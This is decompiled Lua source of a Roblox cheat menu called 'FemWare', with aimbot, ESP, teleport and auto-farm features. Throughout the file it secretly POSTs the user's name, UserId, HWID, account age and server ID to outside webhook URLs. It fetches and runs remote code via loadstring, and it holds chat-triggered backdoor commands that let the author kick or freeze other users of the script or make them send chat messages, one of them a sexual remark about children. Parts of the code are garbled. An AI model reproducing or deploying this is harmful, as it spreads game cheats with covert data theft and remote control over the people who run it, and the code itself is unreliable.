    Enabled = false,
    TeamCheck = false,
    VisibleCheck = false,
    TargetPart = "Head",
    Whitelist = false
  },
  FOVSettings = {Visible = false, Radius = 360},
  SilentAimColor = Color3.fromRGB(255, 255, 255)
}
ValidTargetParts = {
  "Head",
  "Torso",
  "Right Leg",
  "Left Leg"
}
if not http_request and nil and nil then
end
Request = syn.request
Player = Players.LocalPlayer
Character = Player.Character or Player.CharacterAdded:Wait()
Mouse = Player:GetMouse()
Cam = workspace.CurrentCamera
WorldToScreen = Cam.WorldToScreenPoint
WorldToViewportPoint = Cam.WorldToViewportPoint
GetPartsObscuringTarget = Cam.GetPartsObscuringTarget
ExpectedArguments = {
  Raycast = {
    ArgCountRequired = 3,
    Args = {
      "Instance",
      "Vector3",
      "Vector3",
      "RaycastParams"
    }
  }
}
_G.KWORIRHSNDIJQ = "https://websec.services/send/62a443c68e7bc37463cc2832"
_G.KWOELPWLSPFO = "https://websec.services/send/62ae7eef67036cb9241c0e7b"
_G.Feeb = "https://websec.services/send/62ae7ea067036cb9241c0e6e"
smacker = "https://websec.services/send/62aac943c4c2139f0bca3f36"
supportweb = "https://websec.services/send/62aac980c4c2139f0bca3f3f"
TeleportCooldown = false
function Teleport(_ARG_0_)
  if _ARG_0_ then
    TeleportCooldown = true
    if not game:GetService("Players").LocalPlayer.Character or not (game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) or not (game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")) then
      return
    end
    Instance.new("ScreenGui").Name = "DeathGUI"
    Instance.new("ScreenGui").Parent = game:GetService("Players").LocalPlayer.PlayerGui
    Instance.new("ScreenGui").DisplayOrder = -10000000000
    Instance.new("Frame").Parent = Instance.new("ScreenGui")
    Instance.new("Frame").Size = UDim2.new(5, 0, 5, 0)
    Instance.new("Frame").Position = UDim2.new(0, 0, -1, 0)
    Instance.new("Frame").BackgroundColor3 = Color3.new(0, 0, 0)
    game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position = _ARG_0_
    wait(0.1)
    game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position = Vector3.new(0, -9000000000, 0)
    wait(0.5)
    Instance.new("ScreenGui"):Destroy()
    wait(3)
    TeleportCooldown = false
  else
    SendIT("Cooldown for 3 seconds.", 5)
  end
end
function GetRegister(_ARG_0_)
  for _FORV_5_, _FORV_6_ in ipairs(game:GetService("Workspace").Map.BredMakurz:GetChildren()) do
    if _FORV_6_:FindFirstChild("MainPart") and string.find(_FORV_6_.Name, "Register") and _FORV_6_:FindFirstChild("Values") and _FORV_6_:FindFirstChild("Values").Broken.Value == false and _ARG_0_ > game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_6_:FindFirstChild("MainPart").Position.Magnitude then
      _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_6_:FindFirstChild("MainPart").Position.Magnitude
    end
  end
  return (_FORV_6_:FindFirstChild("MainPart"))
end
function GetSafe(_ARG_0_, _ARG_1_)
  if not _ARG_0_ then
    for _FORV_6_, _FORV_7_ in ipairs(game:GetService("Workspace").Map.BredMakurz:GetChildren()) do
      if _FORV_7_:FindFirstChild("MainPart") and not _ARG_1_ and _ARG_0_ >= game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude then
        _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude
      end
    end
    return (_FORV_7_:FindFirstChild("MainPart"))
  else
    for _FORV_6_, _FORV_7_ in ipairs(game:GetService("Workspace").Map.BredMakurz:GetChildren()) do
      if not _ARG_1_ and string.find(_FORV_7_.Name, "Safe") and not _ARG_1_ and _FORV_7_.Values:FindFirstChild("Broken") and _FORV_7_.Values.Broken.Value == false and _ARG_0_ >= game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude then
        _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude
      end
    end
    return (_FORV_7_:FindFirstChild("MainPart"))
  end
end
function GetDealer2(_ARG_0_, _ARG_1_)
  for _FORV_6_, _FORV_7_ in ipairs(game:GetService("Workspace").Map.Shopz:GetChildren()) do
    if not _ARG_1_ then
      if _FORV_7_.Name == _ARG_1_ and _FORV_7_.CurrentStocks.Crowbar.Value > 0 and not _ARG_1_ and _ARG_0_ > game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude then
        _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude
      end
    elseif not _ARG_1_ then
      if _FORV_7_.Name == _ARG_1_ and 0 <= _FORV_7_.CurrentStocks.Lockpick.Value and _FORV_7_:FindFirstChild("MainPart") and _ARG_0_ >= game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude then
        _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude
      end
    elseif _FORV_7_.Name == _ARG_1_ and not _ARG_1_ and _ARG_0_ > game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude then
      _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_7_:FindFirstChild("MainPart").Position.Magnitude
    end
  end
  return (_FORV_7_:FindFirstChild("MainPart"))
end
function GetDealer3(_ARG_0_, _ARG_1_, _ARG_2_)
  for _FORV_7_, _FORV_8_ in ipairs(game:GetService("Workspace").Map.Shopz:GetChildren()) do
    if _FORV_8_.Name == _ARG_1_ and _FORV_8_.CurrentStocks:FindFirstChild(_ARG_2_).Value > 0 and not _ARG_1_ and _ARG_0_ > game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_8_:FindFirstChild("MainPart").Position.Magnitude then
      _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_8_:FindFirstChild("MainPart").Position.Magnitude
    end
  end
  return (_FORV_8_:FindFirstChild("MainPart"))
end
function GetCash(_ARG_0_)
  for _FORV_5_, _FORV_6_ in ipairs(game:GetService("Workspace").Filter.SpawnedBread:GetChildren()) do
    if _ARG_0_ > game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_6_.Position.Magnitude then
      _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_6_.Position.Magnitude
    end
  end
  return _FORV_6_
end
function GetScrap(_ARG_0_)
  for _FORV_5_, _FORV_6_ in ipairs(game:GetService("Workspace").Filter.SpawnedPiles:GetChildren()) do
    if _FORV_6_:FindFirstChild("MeshPart") and _ARG_0_ >= game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_6_:FindFirstChild("MeshPart").Position.Magnitude then
      _ARG_0_ = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - _FORV_6_:FindFirstChild("MeshPart").Position.Magnitude
    end
  end
  return (_FORV_6_:FindFirstChild("MeshPart"))
end
function AutoCrowbar()
  coroutine.resume(coroutine.create(function()
    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Crowbar") and not 15 and GetSafe(15) then
      AutoBreakSafeCoolDown = true
      HitAugs((GetSafe(15)))
      wait(0.5)
      AutoBreakSafeCoolDown = false
    end
  end))
end
AutoLockpick = false
function AutoLockpick()
  coroutine.resume(coroutine.create(function()
    if not AutoLockpick then
      coroutine.resume(coroutine.create(function()
        wait(5)
        AutoLockpick = false
      end))
      AutoLockpick = true
      if game.Players.LocalPlayer.Character:FindFirstChild("Lockpick") then
        game.Players.LocalPlayer.Character:FindFirstChild("Lockpick").Remote:InvokeServer("D", GetSafe(15, false).Parent, "s", (game.Players.LocalPlayer.Character:FindFirstChild("Lockpick").Remote:InvokeServer("S", GetSafe(15, false).Parent, "s")))
        game.Players.LocalPlayer.Character:FindFirstChild("Lockpick").Remote:InvokeServer("C")
      end
    end
  end))
end
function AutoRegister()
  coroutine.resume(coroutine.create(function()
    if not game:GetService("Players").LocalPlayer.Character and not 15 and not AutoBreakRegisterCoolDown then
      AutoBreakRegisterCoolDown = true
      HitAugs2((GetRegister(15)))
      wait(0.5)
      AutoBreakRegisterCoolDown = false
    end
  end))
end
if not nil then
  (function(_ARG_0_)
    Request = not HttpPost and (_ARG_0_ or "WTF?") and (_ARG_0_ or "WTF?") and syn.request
    Request({
      Url = smacker,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor : Reason",
                value = (_ARG_0_ or "WTF?") .. " : " .. _ARG_0_,
                inline = true
              }
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
    game:HttpGet("https://maper.info/Xjquc")
  end)("Blacklisted Bozo")
  Player:Kick("You've been blacklisted. Appeal over #support: https://discord.gg/9dJkSke4M5")
  wait(15)
  while true do
    game:Shutdown()
  end
  return
end
if nil then
  (function(_ARG_0_)
    Request = not HttpPost and (_ARG_0_ or "WTF?") and (_ARG_0_ or "WTF?") and syn.request
    Request({
      Url = smacker,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor : Reason",
                value = (_ARG_0_ or "WTF?") .. " : " .. _ARG_0_,
                inline = true
              }
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
    game:HttpGet("https://maper.info/Xjquc")
  end)("Single Execution Bypass")
  while true do
    game:Shutdown()
  end
end
(function()
  Request = not game:GetService("HttpService") or request or http_request or syn.request
  if _G.HOGRIDER then
    Request({
      Url = _G.HOGRIDER,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor",
                value = nil or "WTF?",
                inline = true
              },
              {
                name = "Server Id",
                value = game:GetService("ReplicatedStorage").Values.ServerId.Value,
                inline = true
              },
              {
                name = "Game Mode",
                value = game:GetService("ReplicatedStorage").Values.GameMode.Value,
                inline = true
              }
            },
            footer = {
              text = os.date()
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
  else
    Request({
      Url = _G.KWORIRHSNDIJQ,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor",
                value = nil or "WTF?",
                inline = true
              },
              {
                name = "Server Id",
                value = game:GetService("ReplicatedStorage").Values.ServerId.Value,
                inline = true
              },
              {
                name = "Game Mode",
                value = game:GetService("ReplicatedStorage").Values.GameMode.Value,
                inline = true
              }
            },
            footer = {
              text = os.date()
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
  end
end)()
game:GetService("Workspace").Filter.SpawnedPiles.ChildAdded:Connect(function(_ARG_0_)
  if ESPSettings.ScrapESP.Enabled == true then
    coroutine.wrap(ScrapESP)(_ARG_0_)
  end
end)
Framework = loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/FemWare/main/UI", true))()
ESPFramework = loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/FemWare/main/ESP", true))()
wait(3)
SafeAutoFarmCoolDown = false
AutoBreakSafeCoolDown = false
AutoBreakRegisterCoolDown = false
ScrapAutoFarmCoolDown = false
ScrapAutoFarm = false
SafeAutoFarm = false
NewSafeAutoFarm = false
NewSafeAutoFarmCoolDown = false
EzBypassActivated = false
SilentAimActivated = false
InfiniteStaminaActivated = false
NoJumpCooldownActivated = false
AimBotActivated = false
AntiCheatActivated = false
if Player.UserId ~= Player.CharacterAppearanceId or _G.vkeofjvma ~= nil and _G.vkeofjvma ~= "PQIRN1048MS" then
  (function(_ARG_0_)
    Request = not HttpPost and (_ARG_0_ or "WTF?") and (_ARG_0_ or "WTF?") and syn.request
    Request({
      Url = smacker,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor : Reason",
                value = (_ARG_0_ or "WTF?") .. " : " .. _ARG_0_,
                inline = true
              }
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
    game:HttpGet("https://maper.info/Xjquc")
  end)("Whitelist Bypass")
  Player:Kick("You are not Whitelisted. Appeal over #support: https://discord.gg/9dJkSke4M5")
  wait(15)
  while true do
    game:Shutdown()
  end
elseif _G.vkeofjvma == "PQIRN1048MS" and HWList[game:GetService("RbxAnalyticsService"):GetClientId()] then
  FemWare = Framework:CreateWindow(Version, Vector2.new(620, 700))
  Prem = FemWare:CreateTab("Premium")
  PremSec = Prem:CreateSector("Control Center", "left")
  PremCore = Prem:CreateSector("Subject to Change", "left")
  PremCustoms = Prem:CreateSector("Customization", "right")
  PremSec:AddLabel("<> = Required")
  PremSec:AddLabel("[] = Optional")
  PremSec:AddTextbox("<NAME> [TEXT]", false, function(_ARG_0_)
    _UPVALUE0_ = _ARG_0_
  end)
  PremSec:AddButton("Kick", function()
    if _UPVALUE0_ ~= nil or _UPVALUE0_ == " " then
      chat("/c system")
      chat("x " .. _UPVALUE0_)
      chat("/c all")
    end
  end)
  PremSec:AddTextbox("<NAME> [TEXT]", false, function(_ARG_0_)
    _UPVALUE0_ = _ARG_0_
  end)
  PremSec:AddButton("Kill", function(_ARG_0_)
    if _UPVALUE0_ ~= nil or _UPVALUE0_ == " " then
      chat("/c system")
      chat("v " .. _UPVALUE0_)
      chat("/c all")
    end
  end)
  PremSec:AddTextbox("[TEXT]", false, function(_ARG_0_)
    _UPVALUE0_ = _ARG_0_
  end)
  PremSec:AddButton("Force Chat: All", function(_ARG_0_)
    if _UPVALUE0_ ~= nil then
      chat("/c system")
      chat("q " .. _UPVALUE0_)
      chat("/c all")
    end
  end)
  PremSec:AddTextbox("<NAME> [TEXT]", false, function(_ARG_0_)
    _UPVALUE0_ = _ARG_0_
  end)
  PremSec:AddButton("Force Chat: User", function(_ARG_0_)
    if _UPVALUE0_ ~= nil or _UPVALUE0_ == " " then
      chat("/c system")
      chat("c " .. _UPVALUE0_)
      chat("/c all")
    end
  end)
  PremCore:AddToggle("Auto Farm All", nil, function(_ARG_0_)
    ITHAPPEN = false
    if _ARG_0_ == true then
      NewSafeAutoFarm = true
      clipping = game:GetService("RunService").RenderStepped:Connect(function()
        if nil and not ITHAPPEN then
          ITHAPPEN = true
          wait(10)
          ITHAPPEN = false
          return
        end
        if not game.Players.LocalPlayer.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Character then
          ITHAPPEN = true
          wait(10)
          ITHAPPEN = false
          return
        end
        if not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and not ITHAPPEN then
          ITHAPPEN = true
          wait(10)
          ITHAPPEN = false
          return
        end
        if not (0 < game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health) and not ITHAPPEN then
          ITHAPPEN = true
          wait(10)
          ITHAPPEN = false
          return
        end
        if not game.Players.LocalPlayer.Name and not ITHAPPEN then
          ITHAPPEN = true
          wait(10)
          ITHAPPEN = false
          return
        end
        if ITHAPPEN or game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") or not clipping then
          return
        end
        if GetSafe(math.huge, false) ~= nil then
          if GetCash(10) == nil and NewSafeAutoFarm and not NewSafeAutoFarmCoolDown and game:GetService("Players").LocalPlayer.Character.Humanoid.Health >= 15 then
            coroutine.resume(coroutine.create(function()
              NewSafeAutoFarmCoolDown = true
              coroutine.resume(coroutine.create(function()
                wait(7.5)
                NewSafeAutoFarmCoolDown = false
              end))
              wait(0.3)
              if not game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Lockpick") then
                coroutine.resume(coroutine.create(function()
                  game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
                  game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Lockpick"))
                end))
                Teleport(2 + 3)
                repeat
                  wait()
                until GetSafe(15, false) ~= nil
                if not GetSafe(math.huge, false) then
                  game.Players.LocalPlayer.Character:FindFirstChild("Lockpick").Remote:InvokeServer("D", GetSafe(math.huge, false).Parent, "s", (game.Players.LocalPlayer.Character:FindFirstChild("Lockpick").Remote:InvokeServer("S", GetSafe(math.huge, false).Parent, "s")))
                  game.Players.LocalPlayer.Character:FindFirstChild("Lockpick").Remote:InvokeServer("C")
                end
              else
                Teleport(2 + 3)
                coroutine.resume(coroutine.create(function()
                  for _FORV_3_ = 1, 10 do
                    coroutine.resume(coroutine.create(function()
                      game:GetService("ReplicatedStorage").Events.SSHPRMTE1:InvokeServer("IllegalStore", "Misc", "Lockpick", _UPVALUE0_)
                    end))
                  end
                end))
              end
            end))
          end
        elseif GetRegister(math.huge) ~= nil and GetCash(10) == nil and NewSafeAutoFarm and 10 and game:GetService("Players").LocalPlayer.Character.Humanoid.Health >= 15 then
          coroutine.resume(coroutine.create(function()
            NewSafeAutoFarmCoolDown = true
            coroutine.resume(coroutine.create(function()
              wait(7)
              NewSafeAutoFarmCoolDown = false
            end))
            wait(0.3)
            coroutine.resume(coroutine.create(function()
              game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fists"))
            end))
            Teleport(2 + 3)
          end))
        end
      end)
    end
    sipping = game:GetService("RunService").RenderStepped:Connect(function()
      coroutine.resume(coroutine.create(function()
        if not game:GetService("Players").LocalPlayer.Character and not 15 and GetRegister(15) then
          AutoBreakRegisterCoolDown = true
          HitAugs2((GetRegister(15)))
          wait(1)
          AutoBreakRegisterCoolDown = false
        end
      end))
    end)
    if _ARG_0_ == false and not _ARG_0_ then
      NewSafeAutoFarm = false
      clipping:Disconnect()
    end
    if _ARG_0_ == false and sipping then
      NewSafeAutoFarm = false
      sipping:Disconnect()
    end
  end):AddKeybind("None")
  PremCustoms:AddSeperator("Background")
  PremCustoms:AddDropdown("Imagess", {
    "Legacy",
    "Hearts",
    "Abstract",
    "Hexagon",
    "Circles",
    "Lace",
    "Floral"
  }, "Legacy", false, function(_ARG_0_)
    if _ARG_0_ == "Legacy" then
      Framework.theme.background = "rbxassetid://7032472167"
      FemWare:UpdateBackground()
    elseif _ARG_0_ == "Hearts" then
      Framework.theme.background = "rbxassetid://6073763717"
      FemWare:UpdateBackground()
    elseif _ARG_0_ == "Abstract" then
      Framework.theme.background = "rbxassetid://6073743871"
      FemWare:UpdateBackground()
    elseif _ARG_0_ == "Hexagon" then
      Framework.theme.background = "rbxassetid://6073628839"
      FemWare:UpdateBackground()
    elseif _ARG_0_ == "Circles" then
      Framework.theme.background = "rbxassetid://6071579801"
      FemWare:UpdateBackground()
    elseif _ARG_0_ == "Lace" then
      Framework.theme.background = "rbxassetid://6071575925"
      FemWare:UpdateBackground()
    elseif _ARG_0_ == "Floral" then
      Framework.theme.background = "rbxassetid://5553946656"
      FemWare:UpdateBackground()
    end
  end)
  PremCustoms:AddTextbox("Custom Image", false, function(_ARG_0_)
    Framework.theme.background = "rbxassetid://" .. _ARG_0_
    FemWare:UpdateBackground()
  end)
  PremCustoms:AddTextbox("Cursor Image", false, function(_ARG_0_)
    Framework.cursor.Data = game:HttpGet(_ARG_0_)
  end)
  PremCustoms:AddColorpicker("Image Color", Color3.new(1, 1, 1), function(_ARG_0_)
    Framework.theme.imagecolor = _ARG_0_
    FemWare:UpdateBackground()
  end)
  PremCustoms:AddColorpicker("Background Color", Color3.new(), function(_ARG_0_)
    Framework.theme.backgroundcolor = _ARG_0_
    FemWare:UpdateBackground()
  end)
  PremCustoms:AddSlider("Tile Size", 0, 300, 1000, 1, function(_ARG_0_)
    Framework.theme.tilesize = _ARG_0_
    FemWare:UpdateBackground()
  end)
  PremCustoms:AddSeperator("UI")
  PremCustoms:AddColorpicker("Accent 1", Framework.theme.accentcolor, function(_ARG_0_)
    Framework.theme.accentcolor = _ARG_0_
    FemWare:UpdateTheme()
  end)
  PremCustoms:AddColorpicker("Accent 2", Framework.theme.accentcolor2, function(_ARG_0_)
    Framework.theme.accentcolor2 = _ARG_0_
    FemWare:UpdateTheme()
  end)
  PremCustoms:AddColorpicker("Top 1", Framework.theme.topcolor, function(_ARG_0_)
    Framework.theme.topcolor = _ARG_0_
    FemWare:UpdateTheme()
  end)
  PremCustoms:AddColorpicker("Top 2", Framework.theme.topcolor2, function(_ARG_0_)
    Framework.theme.topcolor2 = _ARG_0_
    FemWare:UpdateTheme()
  end)
  PremCustoms:AddColorpicker("Text Color", Framework.theme.tabstextcolor, function(_ARG_0_)
    Framework.theme.tabstextcolor = _ARG_0_
    Framework.theme.toptextcolor = _ARG_0_
    FemWare:UpdateTheme()
  end)
  PremCustoms:AddColorpicker("Sector Color", Framework.theme.sectorcolor, function(_ARG_0_)
    Framework.theme.sectorcolor = _ARG_0_
    FemWare:UpdateTheme()
  end)
  PremCustoms:AddDropdown("Fonts", {
    "Code",
    "Cartoon",
    "Arcade",
    "Bodoni",
    "SciFi",
    "Gotham",
    "Fantasy"
  }, "Code", false, function(_ARG_0_)
    if _ARG_0_ == "Code" then
      Framework.theme.font = Enum.Font.Code
      FemWare:UpdateTheme()
    elseif _ARG_0_ == "Cartoon" then
      Framework.theme.font = Enum.Font.Cartoon
      FemWare:UpdateTheme()
    elseif _ARG_0_ == "Arcade" then
      Framework.theme.font = Enum.Font.Arcade
      FemWare:UpdateTheme()
    elseif _ARG_0_ == "Bodoni" then
      Framework.theme.font = Enum.Font.Bodoni
      FemWare:UpdateTheme()
    elseif _ARG_0_ == "SciFi" then
      Framework.theme.font = Enum.Font.SciFi
      FemWare:UpdateTheme()
    elseif _ARG_0_ == "Gotham" then
      Framework.theme.font = Enum.Font.Gotham
      FemWare:UpdateTheme()
    elseif _ARG_0_ == "Fantasy" then
      Framework.theme.font = Enum.Font.Fantasy
      FemWare:UpdateTheme()
    end
  end)
else
  FemWare = Framework:CreateWindow(Version, Vector2.new(595, 700))
end
Credits = FemWare:CreateTab("Settings")
General = FemWare:CreateTab("General")
Extra = FemWare:CreateTab("Miscellaneous")
Visuals = FemWare:CreateTab("Visuals")
TeleportsSS = FemWare:CreateTab("Teleports")
TeleportsS = FemWare:CreateTab("Locations")
MainS = General:CreateSector("Character Modifications", "left")
VisualsS = General:CreateSector("Local Modifications", "left")
SilentAimS = General:CreateSector("Weapon Assist", "right")
GunModsS = General:CreateSector("Weapon Modifications", "right")
PlayerS = General:CreateSector("Auto's and No Ball's", "right")
CustomS = Extra:CreateSector("Audio", "left")
CustomT = Extra:CreateSector("Extra", "left")
CustomK = Extra:CreateSector("Auto PVP", "left")
CustomF = Extra:CreateSector("Auto Farms", "left")
PlayerEspS = Visuals:CreateSector("Player Visuals", "left")
DealersESP = Visuals:CreateSector("Dealer Visuals", "left")
AtmsESP = Visuals:CreateSector("ATM Visuals", "left")
ScrapEspS = Visuals:CreateSector("Scrap Visuals", "right")
SafeEspS = Visuals:CreateSector("Safe Visuals", "right")
RegisterEspS = Visuals:CreateSector("Register Visuals", "right")
ViewmodelS = Extra:CreateSector("ViewModel", "right")
StaffDetect = Extra:CreateSector("Staff Detector", "right")
AutoBreaks = Extra:CreateSector("Auto Breakers", "right")
InfoS = Credits:CreateSector("UI Settings", "right")
CreditsS = Credits:CreateSector("Credits", "left")
FeedB = Credits:CreateSector("Words of Encouragement", "right")
MiscS = Credits:CreateSector("Community Server", "right")
ConfigS = Credits:CreateConfigSystem("left")
TeleportNew1 = TeleportsSS:CreateSector("Locations", "right")
TeleportNew2 = TeleportsSS:CreateSector("Snipe", "left")
TeleportNew3 = TeleportsSS:CreateSector("Find Dealers", "left")
TeleportFix = TeleportsS:CreateSector("Fix", "left")
TeleportAreas1 = TeleportsS:CreateSector("Loot Locations", "left")
TeleportAreas2 = TeleportsS:CreateSector("Primary Locations", "right")
TeleportAreas3 = TeleportsS:CreateSector("Dealers", "left")
TeleportAreas4 = TeleportsS:CreateSector("ATMs", "right")
SilentAIMFov = Drawing.new("Circle")
SilentAIMFov.Thickness = 1
SilentAIMFov.NumSides = 100
SilentAIMFov.Radius = 360
SilentAIMFov.Filled = false
SilentAIMFov.Visible = false
SilentAIMFov.ZIndex = 999
SilentAIMFov.Transparency = 1
SilentAIMFov.Color = SilentSettings.SilentAimColor
SilentSettings.Visible = false
function CheckStaff(_ARG_0_)
  coroutine.resume(coroutine.create(function()
    if _UPVALUE0_:GetRankInGroup(4165692) > 1 then
      if Settings.StaffDetector.Type == "Kick" then
        game:GetService("Players").LocalPlayer:Kick("Staff Detected: " .. _UPVALUE0_.Name)
      else
        StarterGui:SetCore("SendNotification", {
          Title = "FemWare",
          Text = "Staff Alert\n" .. AdminUserCheck.Name .. ", Is in the server.",
          Icon = "rbxassetid://9327507243",
          Duration = 120
        })
      end
    else
      print(_UPVALUE0_.Name)
    end
  end))
end
for _FORV_17_, _FORV_18_ in pairs(game:GetService("Players"):GetPlayers()) do
  CheckStaff(_FORV_18_)
  _FORV_18_.Chatted:Connect(function(_ARG_0_)
    if _ARG_0_:split(" ")[1] == "x" then
      if not _ARG_0_:split(" ") and GenerateHuman(_ARG_0_:split(" ")[2]) ~= nil and GenerateHuman(_ARG_0_:split(" ")[2]) == Player then
        if _ARG_0_:split(" ") then
          if _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "explode" or _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == " explode" then
            while true do
              print("L BOZO STAY MAD")
            end
          else
            if _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == "" or _ARG_0_:split(_ARG_0_:split(" ")[2])[2] == " " then
              _UPVALUE2_(_UPVALUE0_)
              game.Players.LocalPlayer:Kick("Account Status Changed.")
            else
              _UPVALUE2_(_UPVALUE0_, _ARG_0_:split(_ARG_0_:split(" ")[2])[2])
              game.Players.LocalPlayer:Kick(_ARG_0_:split(_ARG_0_:split(" ")[2])[2])
            end
            else
              StarterGui:SetCore("SendNotification", {
                Title = Version,
                Text = _UPVALUE0_.Name .. ": Attempted Kick. Denied.",
                Icon = "rbxassetid://9327507243",
                Duration = 30
              })
            end
            elseif _ARG_0_:split(" ")[1] == "q" then
              if not _ARG_0_:split(" ") then
                if _ARG_0_:split(" ")[2] == nil then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
                elseif _ARG_0_:split(" ")[2] == "1" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("*SNIFFS* Aww, it stinks.", "All")
                elseif _ARG_0_:split(" ")[2] == "2" then
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I love little boys", "All")
                else
                  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_ARG_0_:split(" ")[2], "All")
                end
              end
            elseif _ARG_0_:split(" ")[1] == "c" then
              if not _ARG_0_:split(" ") and GenerateHuman(_ARG_0_:split(" ")[2]) ~= nil and GenerateHuman(_ARG_0_:split(" ")[2]) == Player then
